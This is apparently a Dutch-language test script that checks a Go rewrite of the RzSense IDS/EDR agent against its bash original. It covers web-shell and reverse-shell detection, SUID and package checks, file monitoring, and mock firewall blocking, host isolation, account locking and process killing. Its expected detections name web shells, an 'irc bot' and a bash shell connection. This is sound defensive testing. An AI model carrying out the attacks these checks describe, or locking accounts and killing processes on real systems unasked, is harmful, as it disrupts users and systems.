        ids_bg() { :; }
        rm -f "$i_dir/hard" "$J/b/ss_t" "$J/b/ss_tu"
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p; /^json_text() {/,/^}/p' agent/src/15-realtime.sh; sed -n '/^ss_listen() {/,/^}/p' agent/src/00-kop.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^    web_json=""$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^    hard_part=""$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^    conns_json=""; out_json=""/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
        # shellcheck disable=SC1090
        source <(sed -n '/^    fim_dir="\$i_dir\/fim"$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
        # shellcheck disable=SC2154
        printf '{"web":[%s],"conns":[%s],"out":[%s]%s,%s"x":0}' "${web_json%,}" "${conns_json%,}" "${out_json%,}" "$hard_part" "$ids_json" >"$1"
    ) || fail "de bash-code voor het IDS (tweede deel) faalde"
}
ids_go() { PATH="$J/bin:$PATH" RZSENSE_BASH_CACHE="$J/gc" RZSENSE_DATA="$J/gd" RZSENSE_TEST_FIMOLD="${2-}" "$work/rzsense" ids-obs2 >"$1" || fail "de Go-agent kon het tweede deel van het IDS niet waarnemen"; }
ids_bash "$J/bash1.json"; ids_go "$J/go1.json"
cp "$J/b/ids/fim/state.new" "$J/state1"
# de stand vastleggen (zoals na een aangenomen rapport), dan: inhoud veranderd met dezelfde grootte en tijd (de hash blijft),
# een nieuw bestand, een verdwenen bestand, andere rechten
cp "$J/b/ids/fim/state.new" "$J/b/ids/fim/state"; cp "$J/b/ids/fim/meta.new" "$J/b/ids/fim/meta"; cp "$J/b/ids/fim/roots.new" "$J/b/ids/fim/roots"
cp -p "$J/w/srv/a.pem" "$J/a.keep"; printf 'EEN\n' >"$J/w/srv/a.pem"; touch -r "$J/a.keep" "$J/w/srv/a.pem"
printf 'nieuw\n' >"$J/w/etc/app/nieuw.txt"; rm -f "$J/w/etc/app/weg.txt"; chmod 640 "$J/w/etc/app/sub dir/met spatie.txt"
ids_bash "$J/bash2.json"; ids_go "$J/go2.json" "$J/b/ids/fim/state"
kill "$j_pid" 2>/dev/null || true
# SUID: echte find tegenover de Go-agent, in een namaak-boom (container-images worden overgeslagen)
for f in usr/bin/su usr/bin/gewoon var/lib/docker/x/su home/piet/.local/share/containers/y/su; do printf 'x' >"$J/suid/$f"; done
chmod 4755 "$J/suid/usr/bin/su" "$J/suid/var/lib/docker/x/su" "$J/suid/home/piet/.local/share/containers/y/su"
(cd "$J/suid" && find . -xdev \( -path ./proc -o -path ./var/lib/docker -o -path './home/*/.local/share/containers' \) -prune -o -type f -perm -4000 -print | sed 's/^\.//' | sort) >"$J/suid.find"
"$work/rzsense" ids-obs2 suid "$J/suid" 2>/dev/null | python3 -I -c 'import json,sys; print("\n".join(sorted(json.load(sys.stdin)["suid"])))' >"$J/suid.go"
cmp -s "$J/suid.find" "$J/suid.go" && [ "$(cat "$J/suid.go")" = /usr/bin/su ] || fail "SUID-bestanden: find vond $(tr '\n' ' ' <"$J/suid.find"), de Go-agent $(tr '\n' ' ' <"$J/suid.go")"
# pakketcontrole: de uitvoer van rpm -Va en debsums -c door hetzelfde filter
printf 'S.5....T.  c /etc/ssh/sshd_config\n..5....T.    /usr/bin/ls\n.M.......    /usr/bin/su\nS.5....T.    /usr/share/doc/x\nmissing     /usr/lib64/libx.so\n..5......  d /usr/lib/systemd/y\n' >"$J/rpm.txt"
want=$(awk '$1 ~ /^..5/ { print $NF }' "$J/rpm.txt" | grep -E '^/(usr/)?(s?bin|lib|lib64)/' | head -n 100 | tr '\n' ' ')
got=$("$work/rzsense" ids-pkgdiff rpm <"$J/rpm.txt" | python3 -I -c 'import json,sys; print("".join(p + " " for p in json.load(sys.stdin)))')
[ "$want" = "$got" ] && [ "$got" = "/usr/bin/ls /usr/lib/systemd/y " ] || fail "pakketcontrole (rpm): bash '$want', go '$got'"
printf '/usr/bin/gewijzigd\n/etc/iets\n/lib/x86_64-linux-gnu/libz.so.1\n' >"$J/deb.txt"
want=$(grep -E '^/(usr/)?(s?bin|lib|lib64)/' "$J/deb.txt" | head -n 100 | tr '\n' ' ')
got=$("$work/rzsense" ids-pkgdiff deb <"$J/deb.txt" | python3 -I -c 'import json,sys; print("".join(p + " " for p in json.load(sys.stdin)))')
[ "$want" = "$got" ] || fail "pakketcontrole (debsums): bash '$want', go '$got'"
python3 -I - "$J" <<'PY' || fail "de Go-agent neemt voor het IDS (tweede deel) iets anders waar dan de bash-agent"
import json, sys
J = sys.argv[1]
bad = []
for r in ('1', '2'):
    a, g = [json.load(open('%s/%s%s.json' % (J, w, r))) for w in ('bash', 'go')]
    for k in ('web', 'conns', 'out', 'fimc'):
        if a[k] != g[k]:
            bad.append('ronde %s %s:\n  bash %s\n  go   %s' % (r, k, json.dumps(a[k]), json.dumps(g[k])))
    ha, hg = a['hard'], g['hard']
    for k in sorted(set(ha) | set(hg)):
        va, vg = ha.get(k), hg.get(k)
        if k == 'ww_files' and va is not None and vg is not None:
            va, vg = bool(va), bool(vg)   # hooguit vijf voorbeelden; welke hangt af van de volgorde in de map
        if k == 'sudo_nopw' and va is not None and vg is not None:
            va, vg = sorted(va.split(',')), sorted(vg.split(','))
        if va != vg:
            bad.append('ronde %s hardening %s: bash %r, go %r' % (r, k, va, vg))
    sa = sorted(open('%s/b/ids/fim/state.new' % J).read().splitlines()) if r == '2' else sorted(open('%s/state1' % J).read().splitlines())
    sg = sorted(g['fim_state'].splitlines())
    if sa != sg:
        bad.append('ronde %s bestanden bewaken:\n  alleen bash %s\n  alleen go   %s' % (r, [l for l in sa if l not in sg][:4], [l for l in sg if l not in sa][:4]))
    if a['fim']['n'] != g['fim']['n'] or a['fim']['n'] != len(sa):
        bad.append('ronde %s aantal bewaakte bestanden: bash %s, go %s' % (r, a['fim']['n'], g['fim']['n']))
a1 = json.load(open(J + '/bash1.json')); a2 = json.load(open(J + '/bash2.json')); g2 = json.load(open(J + '/go2.json'))
names1 = sorted(l.split('\t')[0].replace(J + '/w', '') for l in open(J + '/state1'))
want = ['/etc/app/app.conf', '/etc/app/sub dir/met spatie.txt', '/etc/app/weg.txt', '/srv/a.pem', '/srv/los.bin']
web = sorted((w['tool'], w['web'], w['user']) for w in a1['web'])
conn = sorted((c['kind'], c['proc']) for c in a1['conns'])
ch = sorted(e[0].replace(J + '/w', '') for e in a2['fim']['c'])
if bad or names1 != want or web != [('curl', 'user:apache', 'apache'), ('sh', 'php-fpm8.2', 'www-data')] or conn != [('port', 'evil'), ('port', 'irc bot'), ('shell', 'bash')] \
        or a1['hard'].get('open_db') != '3306,5432' or a1['hard'].get('docker_sock') != 'tcp' or a1['hard'].get('legacy_svc') != '21,23,69' or 'uid0' not in a1['hard'] \
        or ch != ['/etc/app/nieuw.txt', '/etc/app/sub dir/met spatie.txt'] or len(a2['fim']['d']) != 1 or len(g2['fim']['sample']) != g2['fim']['n']:
    print('\n'.join(bad) or 'onverwachte testgegevens: %s' % json.dumps([names1, web, conn, a1['hard'], ch, a2['fim']], ensure_ascii=False)[:2500]); sys.exit(1)
print('✔ IDS als proef, tweede deel: %d webshells, %d verdachte verbindingen, %d uitgaande adressen, hardening (%d instellingen), SUID, pakketcontrole en bestanden bewaken (%d bestanden; uitzonderingen, jokertekens, een ongewijzigde tijd): gelijk aan de bash-agent'
      % (len(a1['web']), len(a1['conns']), len(a1['out']), len(a1['hard']), a1['fim']['n']))
PY

# 1.360.0 (Go-agent 0.29.0): het IDS grijpt in: firewall, lokaas-poort, proces stoppen, isoleren en een account
# vergrendelen. De echte bash-code en de Go-agent krijgen dezelfde namaak-nft, -usermod, -pkill en -getent; vergeleken
# wordt wat ze naar nft sturen, wat ze melden en wat ze onthouden. Er wordt hier niets echt geblokkeerd.
K="$work/ids3"; mkdir -p "$K/bin" "$K/b" "$K/g/gc" "$K/g/gd"
cat >"$K/bin/nft" <<'EOF'
#!/bin/bash
# namaak-nft: NFT_DIR houdt bij welke tabellen er zijn en wat er gezet is
d=${NFT_DIR:?}; mkdir -p "$d"
case "$*" in
    "-f -")
        script=$(cat)
        if [ -f "$d/fail" ]; then echo "Error: boem, dit gaat niet" >&2; printf 'MISLUKT\n%s\n' "$script" >>"$d/log"; exit 1; fi
        if [ -f "$d/nocounter" ] && [[ "$script" == *"counter;"* ]]; then echo "Error: counter kan hier niet" >&2; printf 'MISLUKT\n%s\n' "$script" >>"$d/log"; exit 1; fi
        printf 'GEZET\n%s\n' "$script" >>"$d/log"
        if [[ "$script" == *"table inet rzmon_iso {"* ]]; then : >"$d/table.rzmon_iso"; else : >"$d/table.rzmon"; fi ;;
    "list table inet rzmon") [ -f "$d/table.rzmon" ] || exit 1; cat "$d/list.txt" 2>/dev/null ;;
    "list table inet rzmon_iso") [ -f "$d/table.rzmon_iso" ] || exit 1 ;;
    "list set inet rzmon dc4") cat "$d/dc4.txt" 2>/dev/null ;;
    "list set inet rzmon dc6") cat "$d/dc6.txt" 2>/dev/null ;;
    "delete table inet rzmon") mv -f "$d/table.rzmon" "$d/table.weg" 2>/dev/null; echo "WEG rzmon" >>"$d/log" ;;
    "delete table inet rzmon_iso") mv -f "$d/table.rzmon_iso" "$d/table.weg" 2>/dev/null; echo "WEG rzmon_iso" >>"$d/log" ;;
    "delete element"*) echo "ELEMENT $(echo "$*" | tr -d ' ')" >>"$d/log" ;;
    *) exit 1 ;;
esac
EOF
cat >"$K/bin/ss" <<'EOF'
#!/bin/sh
case "$*" in *"sport = :2222"*) echo 'LISTEN 0 128 0.0.0.0:2222 0.0.0.0:*' ;; esac
EOF
cat >"$K/bin/getent" <<'EOF'
#!/bin/sh
case "$1 $2" in
    "ahosts rz.test") printf '192.0.2.10     STREAM rz.test\n192.0.2.10     DGRAM\n2001:db8::10    STREAM\n' ;;
    "ahosts reserve.test") printf '192.0.2.20     STREAM reserve.test\n' ;;
    "passwd piet"|"passwd jan") echo "$2:x:1000:1000::/home/$2:/bin/bash" ;;
    *) exit 2 ;;
esac
EOF
cat >"$K/bin/usermod" <<'EOF'
#!/bin/sh
echo "usermod $*" >>"${NFT_DIR:?}/users"
case "$*" in *jan*) exit 1 ;; esac
EOF
cat >"$K/bin/pkill" <<'EOF'
#!/bin/sh
echo "pkill $*" >>"${NFT_DIR:?}/users"
EOF
chmod +x "$K/bin/"*
flag() {  # flag aan|uit <naam>: een vlag voor de namaak-nft van beide kanten
    local side
    for side in b g; do
        mkdir -p "$K/$side/nft"
        if [ "$1" = aan ]; then : >"$K/$side/nft/$2"; else mv -f "$K/$side/nft/$2" "$K/$side/nft/$2.uit" 2>/dev/null || true; fi
    done
}
act_bash() {  # act_bash fw|iso|kill <uitvoer> [IDS_BLOCK] [sent]: de echte code van de bash-agent
    (
        export PATH="$K/bin:$PATH" NFT_DIR="$K/b/nft"
        HA_MODE=0; MONITOR_URL="https://rz.test:8443/rzsense"; MONITOR_URL_FALLBACK="https://reserve.test"; IDS_BLOCK=${3-1}
        t_dir="$K/b"; t_cache="$K/b/tests.cache"; i_dir="$K/b/ids"; mkdir -p "$i_dir"
        ids_mode=$(awk -F'\t' '$1 == "0" && $2 == "ids" { print $3; exit }' "$t_cache")
        lap() { :; }; id() { echo 0; }
        act_log() { printf '%s|%s|%s|%s\n' "$1" "$2" "$3" "${4-}" >>"$K/b/act"; }
        # shellcheck disable=SC1090
        source <(sed -n '/^json_escape() {/,/^}/p; /^json_text() {/,/^}/p' agent/src/15-realtime.sh)
        case "$1" in
            fw) ids_json='{"x":0,'
                # shellcheck disable=SC1090
                source <(sed -n '/^fw_json=""; decoy_json=""/,/^lap weblogs$/p' agent/src/60-ids-en-edr.sh)
                printf '%s' "${ids_json%,}" >"$2"
                if [ "${4-}" = sent ]; then
                    # shellcheck disable=SC1090
                    source <(sed -n '/nft delete element inet rzmon dc[46] /p' agent/src/90-versturen.sh)
                fi ;;
            iso)
                # shellcheck disable=SC1090
                source <(sed -n '/^iso_json=""$/,/^fi$/p' agent/src/60-ids-en-edr.sh)
                printf '{%s}' "${iso_json%,}" >"$2" ;;
            kill)
                # shellcheck disable=SC1090
                source <(sed -n '/^    killed_json=""$/,/^    fi$/p' agent/src/60-ids-en-edr.sh)
                printf '[%s]' "${killed_json%,}" >"$2" ;;
        esac
    ) || fail "de bash-code voor het ingrijpen van het IDS faalde ($1)"
}
act_go() {  # act_go fw|iso|kill|dry|log <uitvoer> [IDS_BLOCK] [sent]
    printf 'MONITOR_URL="https://rz.test:8443/rzsense"\nMONITOR_URL_FALLBACK="https://reserve.test"\nIDS_BLOCK=%s\n' "${3-1}" >"$K/g/conf"
    # shellcheck disable=SC2086
    PATH="$K/bin:$PATH" NFT_DIR="$K/g/nft" RZSENSE_BASH_CONF="$K/g/conf" RZSENSE_BASH_CACHE="$K/g/gc" RZSENSE_DATA="$K/g/gd" RZSENSE_TEST_ROOT=1 \
        "$work/rzsense" ids-act "$1" ${4-} >"$2" || fail "de Go-agent kon het ingrijpen van het IDS niet uitvoeren ($1)"
}
act_both() {  # act_both <naam> fw|iso [IDS_BLOCK] [sent]: beide kanten draaien en alles naast elkaar leggen
    act_bash "$2" "$K/$1.bash.json" "${3-1}" "${4-}"; act_go "$2" "$K/$1.go.json" "${3-1}" "${4-}"
    python3 -I - "$K" "$1" <<'PY' || fail "het IDS grijpt anders in dan de bash-agent ($1)"
import json, os, sys
K, name = sys.argv[1:3]
a, g = [json.load(open('%s/%s.%s.json' % (K, name, w))) for w in ('bash', 'go')]
a.pop('x', None)
def rd(p): return open(p).read() if os.path.exists(p) else ''
bad = []
if a != g: bad.append('gemeld:\n  bash %s\n  go   %s' % (json.dumps(a, sort_keys=True), json.dumps(g, sort_keys=True)))
for f, what in (('nft/log', 'naar nft gestuurd'), ('nft/users', 'accounts')):
    if rd('%s/b/%s' % (K, f)) != rd('%s/g/%s' % (K, f)): bad.append('%s:\n--- bash\n%s\n--- go\n%s' % (what, rd('%s/b/%s' % (K, f))[-1500:], rd('%s/g/%s' % (K, f))[-1500:]))
for fb, fg, what in (('b/ids/fw.sig', 'g/gd/ids/fw.sig', 'vingerafdruk van de firewall'), ('b/iso/sig', 'g/gd/iso/sig', 'vingerafdruk van het isoleren')):
    if rd(K + '/' + fb) != rd(K + '/' + fg): bad.append('%s: bash %r, go %r' % (what, rd(K + '/' + fb), rd(K + '/' + fg)))
if bad: print('\n'.join(bad)); sys.exit(1)
PY
}
# shellcheck disable=SC2059
set_tests() { printf "$@" >"$K/b/tests.cache"; cp "$K/b/tests.cache" "$K/g/gc/tests.cache"; }
soon=$(( $(date +%s) + 3600 )); past=$(( $(date +%s) - 60 ))
for side in b g; do mkdir -p "$K/$side/nft"; printf 'table inet rzmon {\n\tset bl4 {\n\t\ttype ipv4_addr\n\t\tcounter\n\t\telements = { 198.51.100.7 counter packets 12 bytes 720,\n\t\t\t     198.51.100.8 counter packets 0 bytes 0 }\n\t}\n}\n' >"$K/$side/nft/list.txt"; done
# A: blokkeren: dubbel, verlopen, ongeldig, het adres van RzSense zelf (nooit), IPv6, bekende aanvallers, uitgaand, lokaas-poort
set_tests '0\ttick\t30\n0\tids\tblock\n0\tblock\t198.51.100.7\t0\n0\tblock\t198.51.100.8\t%s\n0\tblock\t198.51.100.7\t0\n0\tblock\t198.51.100.9\t%s\n0\tblock\t192.0.2.10\t0\n0\tblock\trz.test\t0\n0\tblock\t2001:db8::bad\t0\n0\tblock\t2001:db8::10\t0\n0\tblock\tniet;een adres\t0\n0\tknet\t203.0.113.0/24\n0\tknet\t198.18.0.1-198.18.0.9\n0\tknet\t2001:db8:dead::/48\n0\tknet\tfout!\n0\toutblock\t1\n0\tdecoy\t2223\n' "$soon" "$past"
act_go dry "$K/dry0.json"   # in de proef, vóór de bash-agent iets zette
[ ! -e "$K/g/nft/log" ] || fail "de dry-run hoort niets naar nft te sturen: $(cat "$K/g/nft/log")"
act_both A fw
act_go dry "$K/dry1.json"
grep -q '198.51.100.7, 198.51.100.8 }' "$K/b/nft/log" && ! grep -q '192.0.2.10\|198.51.100.9\|rz.test' "$K/b/nft/log" && grep -q 'chain out_fw' "$K/b/nft/log" && grep -q 'tcp dport 2223 add @dc4' "$K/b/nft/log" \
    || fail "de namaak-firewall kreeg niet wat verwacht werd: $(cat "$K/b/nft/log")"
python3 -I - "$K" <<'PY' || fail "de dry-run van de firewall klopt niet"
import json, sys
K = sys.argv[1]
d0, d1 = [json.load(open('%s/dry%d.json' % (K, i)))['fw'] for i in (0, 1)]
sig = open(K + '/b/ids/fw.sig').read().strip()
if not (d0['build'] and d0['bash_sig'] == '' and d0['sig'] == sig and d1['sig'] == sig and d1['n'] == 3 and d1['kn'] == 3 and d1['decoy'] == '2223'):
    print('dry-run: %s / %s, bash zette %s' % (d0, d1, sig)); sys.exit(1)
PY
[ "$(grep -c GEZET "$K/g/nft/log")" = 1 ] || fail "de dry-run hoort niets naar nft te sturen"
act_both A2 fw   # dezelfde lijst: niets opnieuw zetten
[ "$(grep -c GEZET "$K/b/nft/log")" = 1 ] || fail "een ongewijzigde lijst hoort niet opnieuw gezet te worden"
# B: een nft zonder tellers per adres: daarna zonder; C: nft weigert alles; D: IDS_BLOCK=0 met lokaas-poort
flag aan nocounter
set_tests '0\ttick\t30\n0\tids\tblock\n0\tblock\t198.51.100.7\t0\n'
act_both B fw
[ "$(grep -c MISLUKT "$K/b/nft/log")" = 1 ] && [ "$(grep -c GEZET "$K/b/nft/log")" = 2 ] || fail "zonder tellers hoort de tabel alsnog gezet te worden"
flag uit nocounter; flag aan fail
set_tests '0\ttick\t30\n0\tids\tblock\n0\tblock\t198.51.100.99\t0\n'
act_both C fw; act_both C2 fw
grep -q '"state": *"error"' "$K/C.go.json" && grep -q boem "$K/C.go.json" || fail "een weigerende nft hoort als fout gemeld te worden: $(cat "$K/C.go.json")"
flag uit fail
set_tests '0\ttick\t30\n0\tids\tblock\n0\tblock\t198.51.100.7\t0\n0\tdecoy\t2223\n'
act_both D fw 0
grep -q '"disabled"' "$K/D.go.json" && ! tail -n 12 "$K/g/nft/log" | grep -q '198.51.100.7' || fail "met IDS_BLOCK=0 hoort er niets geblokkeerd te worden: $(cat "$K/D.go.json")"
# E: leren met een lokaas-poort die in gebruik is; F: leren met lokaas-treffers, die na het rapport uit de set gaan
set_tests '0\ttick\t30\n0\tids\tlearn\n0\tblock\t198.51.100.7\t0\n0\tdecoy\t2222\n'
act_both E fw
grep -q 'in gebruik' "$K/E.go.json" || fail "een lokaas-poort die in gebruik is hoort gemeld te worden: $(cat "$K/E.go.json")"
for side in b g; do printf 'table inet rzmon {\n\tset dc4 {\n\t\ttype ipv4_addr\n\t\tflags dynamic,timeout\n\t\ttimeout 1h\n\t\telements = { 203.0.113.5 expires 59m, 203.0.113.6 expires 12m }\n\t}\n}\n' >"$K/$side/nft/dc4.txt"
    printf 'table inet rzmon {\n\tset dc6 {\n\t\telements = { 2001:db8::5 expires 3m }\n\t}\n}\n' >"$K/$side/nft/dc6.txt"; : >"$K/$side/nft/table.rzmon"; done
set_tests '0\ttick\t30\n0\tids\tlearn\n0\tdecoy\t2223\n'
act_both F fw 1 sent
grep -q '203.0.113.5' "$K/F.go.json" && grep -q 'ELEMENT.*dc4.*203.0.113.5,203.0.113.6' "$K/g/nft/log" && grep -q 'ELEMENT.*dc6' "$K/g/nft/log" || fail "lokaas-treffers: $(cat "$K/F.go.json") $(tail -n 3 "$K/g/nft/log")"
# G: leren zonder lokaas-poort: de tabel gaat weg; H: TrueNAS: alleen detecteren, tenzij RzSense het toestaat
set_tests '0\ttick\t30\n0\tids\tlearn\n'
act_both G fw
grep -q 'WEG rzmon' "$K/g/nft/log" && [ ! -e "$K/g/nft/table.rzmon" ] && [ ! -e "$K/g/gd/ids/fw.sig" ] || fail "zonder blokkeren hoort de tabel weg te gaan"
printf '#!/bin/sh\nexit 0\n' >"$K/bin/midclt"; chmod +x "$K/bin/midclt"
set_tests '0\ttick\t30\n0\tids\tblock\n0\tblock\t198.51.100.7\t0\n0\tdecoy\t2223\n'
act_both H fw
grep -q '"unsupported"' "$K/H.go.json" || fail "TrueNAS hoort alleen te detecteren: $(cat "$K/H.go.json")"
set_tests '0\ttick\t30\n0\tids\tblock\n0\tblock\t198.51.100.7\t0\n0\ttruenas_fw\t1\n'
act_both H2 fw
grep -q '"active"' "$K/H2.go.json" || fail "TrueNAS met toestemming hoort te blokkeren: $(cat "$K/H2.go.json")"
mv -f "$K/bin/midclt" "$K/midclt.uit"
# het logboek: dezelfde meldingen (onderdeel, uitkomst, tekst)
act_go log "$K/act.go.json"
python3 -I - "$K" <<'PY' || fail "het logboek van de Go-agent wijkt af van dat van de bash-agent"
import json, sys
K = sys.argv[1]
a = [l.rstrip('\n').split('|', 3) for l in open(K + '/b/act')]
g = [[e['m'], str(e['ok']), e['a'], e['d']] for e in json.load(open(K + '/act.go.json'))]
if a != g or len(a) < 5:
    print('bash %s\ngo   %s' % (a, g)); sys.exit(1)
PY
# isoleren: alleen RzSense, het reserve-adres, de DNS-servers en de netwerken uit RzSense blijven open; vervalt op tijd
set_tests '0\ttick\t30\n0\tisolate\t%s\t192.168.1.0/24 10.0.0.5 fd00::/8 onzin 10.0.0.5\n0\tuserlock\tpiet\tlock\n0\tuserlock\tjan\tlock\n0\tuserlock\troot\tlock\n0\tuserlock\tonbekend\tlock\n0\tuserlock\tPiet\tlock\n0\tuserlock\tpiet\tkapot\n' "$soon"
act_go dry "$K/drys0.json"
act_both I iso; act_both I2 iso
act_go dry "$K/drys1.json"
grep -q '"active"' "$K/I.go.json" && grep -q '192.168.1.0/24, 10.0.0.5, 192.0.2.10, 192.0.2.20' "$K/g/nft/log" && grep -q 'usermod -L -e 1 piet' "$K/g/nft/users" && grep -q 'pkill -KILL -u piet' "$K/g/nft/users" \
    && ! grep -q 'root\|Piet' "$K/g/nft/users" && grep -q '"fout"' "$K/I.go.json" && grep -q '"onbekend"' "$K/I.go.json" && [ "$(cat "$K/I2.go.json")" != "$(cat "$K/I.go.json")" ] \
    || fail "isoleren of vergrendelen: $(cat "$K/I.go.json") | $(cat "$K/g/nft/users") | $(tail -n 9 "$K/g/nft/log")"
python3 -I - "$K" <<'PY' || fail "de dry-run van het isoleren klopt niet"
import json, sys
K = sys.argv[1]
d0, d1 = [json.load(open('%s/drys%d.json' % (K, i)))['iso'] for i in (0, 1)]
sig = open(K + '/b/iso/sig').read().strip()
if not (d0['sig'] == sig and d1['sig'] == sig):
    print('dry-run: %s / %s, bash zette %s' % (d0, d1, sig)); sys.exit(1)
PY
set_tests '0\ttick\t30\n0\tisolate\t%s\t192.168.1.0/24\n0\tuserlock\tpiet\tunlock\n' "$past"
act_both J iso; act_both J2 iso
grep -q '"off"' "$K/J.go.json" && grep -q 'WEG rzmon_iso' "$K/g/nft/log" && grep -q "usermod -U -e  piet" "$K/g/nft/users" || fail "isoleren hoort op tijd te vervallen: $(cat "$K/J.go.json") $(cat "$K/g/nft/users")"
# een proces stoppen: alleen met de juiste starttijd; een nummer dat niet (meer) klopt blijft staan
sleep 300 & k1=$!; sleep 300 & k2=$!; sleep 300 & k3=$!
disown "$k1" "$k2" "$k3" 2>/dev/null || true
st() { awk '{ print $22 }' "/proc/$1/stat"; }
printf '0\tids\tblock\n0\tkill\t%s\t%s\n0\tkill\t%s\t1\n0\tkill\t4000000\t5\n0\tkill\tx\t5\n' "$k1" "$(st "$k1")" "$k3" >"$K/b/tests.cache"
printf '0\tids\tblock\n0\tkill\t%s\t%s\n0\tkill\t%s\t1\n0\tkill\t4000000\t5\n0\tkill\tx\t5\n' "$k2" "$(st "$k2")" "$k3" >"$K/g/gc/tests.cache"
act_bash kill "$K/kill.bash.json"; act_go kill "$K/kill.go.json"
act_bash kill "$K/kill2.bash.json"; act_go kill "$K/kill2.go.json"
sleep 0.3
python3 -I - "$K" "$k1" "$k2" "$k3" <<'PY' || { kill "$k1" "$k2" "$k3" 2>/dev/null; fail "een proces stoppen gaat anders dan bij de bash-agent"; }
import json, os, sys
K, k1, k2, k3 = sys.argv[1], *map(int, sys.argv[2:5])
a, g, a2, g2 = [json.load(open('%s/%s.json' % (K, n))) for n in ('kill.bash', 'kill.go', 'kill2.bash', 'kill2.go')]
alive = lambda p: os.path.exists('/proc/%d' % p) and open('/proc/%d/stat' % p).read().split()[2] != 'Z'
res = lambda l: [r[2] for r in l]
if res(a) != res(g) or res(a) != ['ok', 'weg', 'weg'] or a2 != [] or g2 != [] or alive(k1) or alive(k2) or not alive(k3) or g[0][0] != k2:
    print('bash %s %s, go %s %s, leeft: %s %s %s' % (a, a2, g, g2, alive(k1), alive(k2), alive(k3))); sys.exit(1)
PY
kill "$k3" 2>/dev/null || true
# bestanden bewaken: alleen de wijzigingen (dezelfde bestanden als hierboven): veranderd, weg, een nieuw bewaakt pad,
# niet meer bewaakt, en alles opnieuw na een nieuwe basismeting in RzSense
fim_cmp() {  # fim_cmp <naam> <bash-json> <go-json>
    python3 -I - "$1" "$2" "$3" <<'PY' || fail "bestanden bewaken ($1): de Go-agent meldt iets anders dan de bash-agent"
import json, sys
name, a, g = sys.argv[1], json.load(open(sys.argv[2]))['fim'], json.load(open(sys.argv[3]))
bad = [k for k in ('n', 'full') if a[k] != g[k]] + [k for k in ('c', 'b', 'd', 'u') if sorted(map(json.dumps, a[k])) != sorted(map(json.dumps, g[k]))]
if bad:
    print('%s: verschil in %s\n  bash %s\n  go   %s' % (name, bad, json.dumps(a)[:1500], json.dumps(g)[:1500])); sys.exit(1)
print(name, a['full'], len(a['c']), len(a['b']), len(a['d']), len(a['u']))
PY
}
mkdir -p "$J/gf"; cp "$J/b/ids/fim/state" "$J/b/ids/fim/meta" "$J/b/ids/fim/roots" "$J/gf/"
fim_go() { RZSENSE_BASH_CONF="$K/g/conf" RZSENSE_BASH_CACHE="$J/gc" RZSENSE_DATA="$J/gd" "$work/rzsense" ids-act fim "$J/gf" commit >"$1" || fail "de Go-agent kon de wijzigingen in bewaakte bestanden niet bepalen"; }
fim_commit() { cp "$J/b/ids/fim/state.new" "$J/b/ids/fim/state"; cp "$J/b/ids/fim/meta.new" "$J/b/ids/fim/meta"; cp "$J/b/ids/fim/roots.new" "$J/b/ids/fim/roots"; }
fim_go "$J/fim2.go.json"
got=$(fim_cmp wijzigingen "$J/bash2.json" "$J/fim2.go.json") || { echo "$got"; exit 1; }
[ "$got" = "wijzigingen 0 2 0 1 0" ] || fail "bestanden bewaken: onverwachte wijzigingen: $got"
fim_commit
fim_cfg=$(printf 'e\t1700000001\np\t2\t%s\np\t1\t%s\np\t2\t%s\nx\t*.log\nx\tcache/\n' "$J/w/etc/app" "$J/w/srv/los.bin" "$J/w/srv/c.txt")
printf '0\tids\tlearn\n0\tfim\t%s\n' "$(printf '%s' "$fim_cfg" | base64 -w0)" >"$J/b/tests.cache"; cp "$J/b/tests.cache" "$J/gc/tests.cache"
ids_bash "$J/bash3.json"; fim_go "$J/fim3.go.json"
got=$(fim_cmp paden "$J/bash3.json" "$J/fim3.go.json") || { echo "$got"; exit 1; }
[ "$got" = "paden 0 0 1 0 1" ] || fail "bestanden bewaken: een nieuw en een vervallen pad: $got"
fim_commit
fim_cfg=$(printf 'e\t1700000999\np\t2\t%s\nx\t*.log\n' "$J/w/etc/app")
printf '0\tids\tlearn\n0\tfim\t%s\n' "$(printf '%s' "$fim_cfg" | base64 -w0)" >"$J/b/tests.cache"; cp "$J/b/tests.cache" "$J/gc/tests.cache"
ids_bash "$J/bash4.json"; fim_go "$J/fim4.go.json"
got=$(fim_cmp basismeting "$J/bash4.json" "$J/fim4.go.json") || { echo "$got"; exit 1; }
[ "${got#basismeting 1 }" != "$got" ] && [ "${got##* 0 0 0}" = "" ] || fail "bestanden bewaken: een nieuwe basismeting stuurt alles opnieuw: $got"
echo "✔ het IDS grijpt in zoals de bash-agent: firewall (blokkades, bekende aanvallers, uitgaand, lokaas-poort, nooit RzSense zelf), TrueNAS, IDS_BLOCK=0, een proces stoppen, isoleren en een account vergrendelen, het logboek, en bestanden bewaken (alleen wijzigingen); de dry-run stuurt niets naar nft"

# 1.361.0 (Go-agent 0.30.0): de endpoint-sensoren (EDR). De parsers krijgen dezelfde testgegevens als de bash-agent; het
# onderdeel "edr" van het rapport, de auditd-regels, de netwerksensor en de bestandssensor draaien naast de echte bash-code
# met een namaak-auditctl, -pidof en -ss.
E="$work/edr"; mkdir -p "$E/bin" "$E/b" "$E/g/gc" "$E/g/gd"
for kind in audit eve; do
    CACHE_DIRECTORY="$E/b" EDR_ROOT=/opt/rzmon EDR_USER=www-data EDR_MARK=0123456789abcdef01234567 bash agent/rzmon-agent.sh --edr-parse "$kind" <"tests/data/$( [ "$kind" = audit ] && echo audit.log || echo eve.json)" >"$E/$kind.bash" || fail "de bash-parser faalde ($kind)"
    RZSENSE_DATA="$E/g/gd" EDR_ROOT=/opt/rzmon EDR_USER=www-data EDR_MARK=0123456789abcdef01234567 "$work/rzsense" edr-parse "$kind" <"tests/data/$( [ "$kind" = audit ] && echo audit.log || echo eve.json)" >"$E/$kind.go" || fail "de Go-parser faalde ($kind)"
    cmp -s "$E/$kind.bash" "$E/$kind.go" || fail "endpoint-sensoren: de parser ($kind) geeft iets anders dan de bash-agent: $(diff "$E/$kind.bash" "$E/$kind.go" | head -n 6)"
done
[ "$(wc -l <"$E/audit.go")" -ge 10 ] && grep -q '"own":"agent"' "$E/audit.go" && grep -q '"k":"a"' "$E/audit.go" && grep -q '"sc":"execve"' "$E/audit.go" || fail "de audit-parser gaf te weinig: $(head -c 600 "$E/audit.go")"
